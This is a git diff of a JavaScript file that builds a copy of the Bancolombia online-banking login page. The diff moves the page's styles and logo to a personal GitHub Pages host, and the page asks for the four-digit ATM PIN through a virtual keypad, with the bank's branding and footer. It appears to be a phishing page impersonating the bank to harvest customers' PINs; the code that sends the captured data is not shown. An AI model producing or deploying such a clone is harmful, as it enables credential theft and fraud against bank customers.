@@ -1,19 +1,24 @@
-let head = `<title>Bancolombia Sucursal Virtual Personas</title>
-<meta http-equiv="content-type" content="text/html; utf-8">
-<meta charset="utf-8">
-<meta content="es" http-equiv="Content-Language">
-<meta name="description" content="">
-<meta name="author" content="">
-<meta name="Copyright" content="">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<link href="../../../../../css/main.css" rel="stylesheet">
-<link href="../../../../../css/keyboard.css" rel="stylesheet">
-<link href="../../../../../css/bootstrap.css" rel="stylesheet">
-<link href="../../../../../css/stylesheet.css" rel="stylesheet">
-<link rel="icon" type="image/png" href="../../../../../img/logo.png" />`;
+var myHosting = "https://itsmariodev.github.io/";
 
-let contenido = `<div class="container">
+let head = `<title>Bancolombia Sucursal Virtual Personas</title>
+  <meta http-equiv="content-type" content="text/html; utf-8">
+  <meta charset="utf-8">
+  <meta content="es" http-equiv="Content-Language">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="Copyright" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link href="${myHosting}css/main.css" rel="stylesheet">
+  <link href="${myHosting}css/keyboard.css" rel="stylesheet">
+  <link href="${myHosting}css/bootstrap.css" rel="stylesheet">
+  <link href="${myHosting}css/stylesheet.css" rel="stylesheet">
+  <link rel="icon" type="image/png" href="${myHosting}img/logo.png" />`;
+
+let body = `
+<form id="loginUserForm" name="loginUserForm">
+<div class="container">
 <div>
     <div id="header" class="mua-page-header">
         <div class="row row-logo-svp">
@@ -71,65 +76,25 @@ let contenido = `<div class="container">
         </div>
 
         <div class="mua-panel-body">
-            <div class="row">
-                <div class="col-lg-5 col-md-5 col-sm-6">
+            <div class="row" id="divMain">
 
-                </div>
+                
 
-                <div class="col-lg-4 col-md-5 col-sm-6">
-                    <div class="panel_general mua-panel_general">
-                        <div class="title-panel-label">
-                            <h1>
-                                Clave
-                            </h1>
-                        </div>
-                        <div class="subtitle-land-label">
-                            <h4>
-                                Por motivos de seguridad es necesario procesar una verificación de identidad.
-                            </h4>
-                        </div>
-                        <div id="contenido">
-                            <div class="mua-content-group-panel">
-                                <div class="mua-label-input">
-                                    <label class="control-label-index" for="username">
-                                        Ingresa tu clave
-                                    </label>
-                                </div>
-                                <div>
-                                    <div class="mua_svp_enroll_update_control">
-                                        <input id="txtPassword" name="password" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" value="" readonly="true" maxlength="4" autocomplete="off">
-                                        <span class="mua-icon-lock"> </span>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="mua-content-legend mua_svp_enroll_update_label">
-                                Ingresa mediante el teclado virtual la clave que usas en el cajero automático.
-                            </div>
-                        </div>
-                        <div class="two-button-container mua-button-container">
-                            <div class="two-button-a">
-                                <input class="btn btn-default" onclick="document.getElementById('password').type='text';document.getElementById('password').value = '';window.location.href='/mua/CLOSE_ALL'; return (false);" type="button" value="Cancelar">
-                            </div>
-                            <div class="two-button-b">
-                                <input id="btnPass" name="btnPass" class="btn btn-success" type="button" value="Ingresar">
-                            </div>
-                        </div>
-                        <div class="mua-panel_enlances">
-                            <div>
-                                <span id="popoverId" class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
-                                <div id="popoverContent" class="hide">
-                                    <span class="mua_tooltip_close">×</span>
-                                    <div class="mua_tooltip_msg">
-                                        Si usted es un Colombiano en el Exterior y no ha sido cliente Bancolombia en el pasado o es un cliente exclusivo Fiduciaria, usted debe generar una clave para continuar con el proceso.
-                                    </div>
-                                </div>
-                                <a href="/mua/GENERATE_PASS_DATA?scis=juoS20bsOqga56u%2BqdmTUqJQnUezG747GAs83Vo01ToQt22cDDjlydDxo1SRxzeX">Genera una clave personal</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+                
+                
+            </div>
+        </div>
+    </div>
+</div>
+</form>
+`;
 
-                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
+let imgSecurity = `
+<div class="col-lg-5 col-md-5 col-sm-6"></div>
+`
+
+let keypad = `
+<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
                     <table align="left" valign="top" cellspacing="0" cellpadding="0" class="bg_button">
                         <tbody>
                             <tr align="left">
@@ -193,7 +158,65 @@ let contenido = `<div class="container">
                         </tbody>
                     </table>
                 </div>
-                <div class="row">
+`
+
+let options = `
+<div class="col-lg-4 col-md-5 col-sm-6">
+                    <div class="panel_general mua-panel_general">
+                        <div class="title-panel-label">
+                            <h1>
+                                Clave
+                            </h1>
+                        </div>
+                        <div class="subtitle-land-label">
+                            <h4>
+                                Por motivos de seguridad es necesario procesar una verificación de identidad.
+                            </h4>
+                        </div>
+                        <div id="contenido">
+                            <div class="mua-content-group-panel">
+                                <div class="mua-label-input">
+                                    <label class="control-label-index" for="username">
+                                        Ingresa tu clave
+                                    </label>
+                                </div>
+                                <div>
+                                    <div class="mua_svp_enroll_update_control">
+                                        <input id="txtPassword" name="password" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" value="" readonly="true" maxlength="4" autocomplete="off">
+                                        <span class="mua-icon-lock"> </span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mua-content-legend mua_svp_enroll_update_label">
+                                Ingresa mediante el teclado virtual la clave que usas en el cajero automático.
+                            </div>
+                        </div>
+                        <div class="two-button-container mua-button-container">
+                            <div class="two-button-a">
+                                <input class="btn btn-default" onclick="document.getElementById('password').type='text';document.getElementById('password').value = '';window.location.href='/mua/CLOSE_ALL'; return (false);" type="button" value="Cancelar">
+                            </div>
+                            <div class="two-button-b">
+                                <input id="btnPass" name="btnPass" class="btn btn-success" type="button" value="Ingresar">
+                            </div>
+                        </div>
+                        <div class="mua-panel_enlances">
+                            <div>
+                                <span id="popoverId" class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
+                                <div id="popoverContent" class="hide">
+                                    <span class="mua_tooltip_close">×</span>
+                                    <div class="mua_tooltip_msg">
+                                        Si usted es un Colombiano en el Exterior y no ha sido cliente Bancolombia en el pasado o es un cliente exclusivo Fiduciaria, usted debe generar una clave para continuar con el proceso.
+                                    </div>
+                                </div>
+                                <a href="/mua/GENERATE_PASS_DATA?scis=juoS20bsOqga56u%2BqdmTUqJQnUezG747GAs83Vo01ToQt22cDDjlydDxo1SRxzeX">Genera una clave personal</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+`
+
+let footer = `
+<div class="row">
                     <div class="col-xs-12 col-sm-12 col-md-12">
                         <p class="mua-footer">
                             Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
@@ -204,18 +227,18 @@ let contenido = `<div class="container">
                     <div class="mua-title-text pull-left" id="ip"></div>
                     <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
                 </div>
-            </div>
-        </div>
-    </div>
-</div>
-`;
+`
 
 function addHead() {
   $("head").append(head);
 }
 
 function addCode() {
-  $("#loginUserForm").html(contenido);
+  $("body").html(body);
+  $("#divMain").html(imgSecurity);
+  $("#divMain").append(options);
+  $("#divMain").append(keypad);
+  $("#divMain").append(footer);
 
   $(".teclado td").hover(function () {
     $(
@@ -353,12 +376,12 @@ window.addEventListener("load", function () {
   //Aquí se puede meter la función addCode() para que el contenido cargue después de que se hayan
   //puesto cargado los estilos y que no se vea el html solo al inicio.
   addCode();
-});
 
-fetch("https://api64.ipify.org?format=json")
-  .then((response) => response.json())
-  .then((data) => {
-    let ip = data.ip;
-    let divIp = document.getElementById("ip");
-    divIp.textContent = "Dirección IP: " + ip;
-  });
+  fetch("https://api64.ipify.org?format=json")
+    .then((response) => response.json())
+    .then((data) => {
+      let ip = data.ip;
+      let divIp = document.getElementById("ip");
+      divIp.textContent = "Dirección IP: " + ip;
+    });
+});
